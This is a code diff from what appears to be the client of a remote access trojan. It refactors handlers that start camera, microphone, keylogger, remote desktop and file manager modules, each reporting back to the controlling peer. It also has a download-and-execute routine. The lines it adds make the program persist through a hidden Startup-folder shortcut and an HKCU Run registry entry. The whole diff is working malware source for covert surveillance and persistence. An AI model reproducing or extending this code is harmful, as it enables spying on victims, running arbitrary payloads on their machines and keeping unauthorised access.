+	if (!m_pModuleMgr->RunModule("filemgr", peer.first.c_str(), peer.second, NULL)){
+		TCHAR szError[] = TEXT("Kernel is busy...");
+		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
 	}
 }
 
 void CKernel::OnRemoteDesktop()
 {
-	char szServerAddr[32] = { 0 };
-	USHORT uPort = 0;
-	GetSrvName(szServerAddr, uPort);
+	auto const  peer = GetPeerName();
 
-	if (!m_pModuleMgr->RunModule("rd", szServerAddr, uPort, NULL)){
-		Send(KNEL_MODULE_BUSY, 0, 0);
+	if (!m_pModuleMgr->RunModule("rd", peer.first.c_str(), peer.second, NULL)){
+		TCHAR szError[] = TEXT("Kernel is busy...");
+		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
 	}
 }
 
 void CKernel::OnMicrophone()
 {
-	char szServerAddr[32] = { 0 };
-	USHORT uPort = 0;
-	GetSrvName(szServerAddr, uPort);
+	auto const  peer = GetPeerName();
 
-	if (!m_pModuleMgr->RunModule("microphone", szServerAddr, uPort, NULL)){
-		Send(KNEL_MODULE_BUSY, 0, 0);
+	if (!m_pModuleMgr->RunModule("microphone", peer.first.c_str(), peer.second, NULL)){
+		TCHAR szError[] = TEXT("Kernel is busy...");
+		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
 	}
 }
 void CKernel::OnCamera()
 {
-	char szServerAddr[32] = { 0 };
-	USHORT uPort = 0;
-	GetSrvName(szServerAddr, uPort);
+	auto const  peer = GetPeerName();
 
-	if (!m_pModuleMgr->RunModule("camera", szServerAddr, uPort, NULL)){
-		Send(KNEL_MODULE_BUSY, 0, 0);
+	if (!m_pModuleMgr->RunModule("camera", peer.first.c_str(), peer.second, NULL)){
+		TCHAR szError[] = TEXT("Kernel is busy...");
+		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * ( lstrlen(szError) + 1));
 	}
 }
 
 
 #include "..\FileManager\FileDownloader.h"
 
-void CKernel::OnDownloadAndExec(WCHAR*szUrl)
+void CKernel::OnDownloadAndExec(TCHAR*szUrl)
 {
 	//download to 
-	WCHAR szTempPath[0x100];
+	TCHAR szTempPath[0x100];
 	GetTempPath(0x100, szTempPath);
 	//Save Path + Url
 	CFileDownloader::InitParam*pInitParam = (CFileDownloader::InitParam*)
-		calloc(1, sizeof(DWORD) + sizeof(WCHAR)* (lstrlenW(szTempPath) + 1 + lstrlenW(szUrl) + 1));
+		calloc(1, sizeof(DWORD) +
+		sizeof(TCHAR)* (lstrlenW(szTempPath) + 1 + lstrlenW(szUrl) + 1));
 
 	pInitParam->dwFlags |= FILEDOWNLOADER_FLAG_RUNAFTERDOWNLOAD;
 	lstrcpyW(pInitParam->szURL, szTempPath);
-	lstrcatW(pInitParam->szURL, L"\n");
+	lstrcatW(pInitParam->szURL, TEXT("\n"));
 	lstrcatW(pInitParam->szURL, szUrl);
 	//
-	char szServerAddr[32] = { 0 };
-	USHORT uPort = 0;
-	GetSrvName(szServerAddr, uPort);
+	auto const  peer = GetPeerName();
 	//
-	if (!m_pModuleMgr->RunModule("filedownloader", szServerAddr, uPort, 
+	if (!m_pModuleMgr->RunModule("filedownloader", peer.first.c_str(), peer.second,
 		(LPVOID)(((DWORD)(pInitParam)) | 0x80000000))){
-		Send(KNEL_MODULE_BUSY, 0, 0);
+		TCHAR szError[] = TEXT("Kernel is busy...");
+		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
 	}
 }
 
-/*******************************************************************
-				*		Other			*
-*******************************************************************/
-static BOOL MakesureDirExist(const WCHAR* Path,BOOL bIncludeFileName = FALSE)
-{
-	WCHAR*pTempDir = (WCHAR*)malloc((lstrlenW(Path) + 1)*sizeof(WCHAR));
-	lstrcpyW(pTempDir, Path);
-	BOOL bResult = FALSE;
-	WCHAR* pIt = NULL;
-	//找到文件名.;
-	if (bIncludeFileName)
-	{
-		pIt = pTempDir + lstrlenW(pTempDir) - 1;
-		while (pIt[0] != '\\' && pIt[0] != '/' && pIt > pTempDir) pIt--;
-		if (pIt[0] != '/' && pIt[0] != '\\')
-			goto Return;
-		//'/' ---> 0
-		pIt[0] = 0;
-	}
-	//找到':';
-	if ((pIt = wcsstr(pTempDir, L":")) == NULL || (pIt[1] != '\\' && pIt[1] != '/'))
-		goto Return;
-	pIt++;
-
-	while (pIt[0])
-	{
-		WCHAR oldCh;
-		//跳过'/'或'\\';
-		while (pIt[0] && (pIt[0] == '\\' || pIt[0] == '/'))
-			pIt++;
-		//找到结尾.;
-		while (pIt[0] && (pIt[0] != '\\' && pIt[0] != '/'))
-			pIt++;
-		//
-		oldCh = pIt[0];
-		pIt[0] = 0;
-
-		if (!CreateDirectoryW(pTempDir, NULL) && GetLastError()!=ERROR_ALREADY_EXISTS)
-			goto Return;
-
-		pIt[0] = oldCh;
-	}
-	bResult = TRUE;
-Return:
-	free(pTempDir);
-	return bResult;
-}
 
 
 void CKernel::OnExit()
@@ -768,16 +810,89 @@ void CKernel::OnExit()
 
 void CKernel::OnKeyboard()
 {
-	char szServerAddr[32] = { 0 };
-	USHORT uPort = 0;
-	GetSrvName(szServerAddr, uPort);
-
-	if (!m_pModuleMgr->RunModule("kblog", szServerAddr, uPort, NULL)){
-		Send(KNEL_MODULE_BUSY, 0, 0);
+	auto const  peer = GetPeerName();
+	if (!m_pModuleMgr->RunModule("kblog", peer.first.c_str(), peer.second, NULL)){
+		TCHAR szError[] = TEXT("Kernel is busy...");
+		SendMsg(KNEL_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
 	}
 }
 
-void CKernel::OnModule(const char*Module,DWORD dwLen){
 
-	m_pModuleMgr->LoadModule(Module, dwLen);
+void CKernel::OnUnilsCopyToStartupMenu(){
+
+	TCHAR StartupPath[MAX_PATH];
+	if (!SHGetSpecialFolderPath(NULL, StartupPath, CSIDL_STARTUP, FALSE)){
+		TCHAR szError[0x100];
+		wsprintf(szError, TEXT("SHGetSpecialFolderPath Failed With Error : %u"), GetLastError());
+		SendMsg(KNEL_ERROR, (char*)szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
+		return;
+	}
+
+	lstrcat(StartupPath, TEXT("\\"));
+	lstrcat(StartupPath, SERVICE_NAME);
+	lstrcat(StartupPath, TEXT(".lnk"));
+
+	HRESULT hres;
+	IShellLink * pShellLink;
+	hres = ::CoCreateInstance(CLSID_ShellLink, NULL, 
+		CLSCTX_INPROC_SERVER, IID_IShellLink, (void **)&pShellLink);
+	if (!SUCCEEDED(hres)){
+		TCHAR szError[0x100];
+		wsprintf(szError, TEXT("CoCreateInstance Failed With Error : %u"), GetLastError());
+		SendMsg(KNEL_ERROR, (char*)szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
+		return;
+	}
+
+	TCHAR exePath[MAX_PATH];
+	TCHAR workDir[MAX_PATH];
+	GetCurrentDirectory(MAX_PATH, workDir);
+	GetModuleFileName(GetModuleHandle(0), exePath, MAX_PATH);
+
+	pShellLink->SetPath(exePath);
+	pShellLink->SetWorkingDirectory(workDir);
+	IPersistFile *pPersistFile;
+	hres = pShellLink->QueryInterface(IID_IPersistFile, (void **)&pPersistFile);
+	if (SUCCEEDED(hres)){
+		hres = pPersistFile->Save(StartupPath, TRUE);
+		TCHAR szError[0x100];
+
+		if (SUCCEEDED(hres)){	
+			wsprintf(szError, TEXT("Copy To Startup Menu Success!"));
+			SendMsg(KNEL_ERROR, (char*)szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
+			SetFileAttributes(StartupPath, FILE_ATTRIBUTE_SYSTEM |
+				FILE_ATTRIBUTE_HIDDEN);
+		}
+		else{
+			wsprintf(szError, TEXT("Copy To Startup Menu Failed (%d)!"),hres);
+			SendMsg(KNEL_ERROR, (char*)szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
+		}
+		pPersistFile->Release();
+	}
+	pShellLink->Release();
+}
+
+void CKernel::OnUtilsWriteStartupReg(){
+	TCHAR exePath[MAX_PATH];
+	GetModuleFileName(GetModuleHandle(0), exePath, MAX_PATH);
+	HKEY hKey = NULL;
+	TCHAR keyPath[] = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+	TCHAR szError[0x100];
+	//Open Key
+	//HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+	if (ERROR_SUCCESS ==
+		RegCreateKey(HKEY_CURRENT_USER, keyPath, &hKey)){
+		DWORD dwError = RegSetValueEx(hKey, SERVICE_NAME, 0,
+			REG_SZ, (BYTE*)exePath, sizeof(TCHAR)*(lstrlen(exePath) + 1));
+		if (dwError){
+			wsprintf(szError, TEXT("RegSetValueEx Failed With Error: %u"), dwError);
+		}
+		else{
+			wsprintf(szError, TEXT("Write Registry Start Success!"), dwError);
+		}
+		RegCloseKey(hKey);
+	}
+	else{
+		wsprintf(szError, TEXT("RegCreateKey Failed With Error: %u"), GetLastError());
+	}
+	SendMsg(KNEL_ERROR, (char*)szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
 }
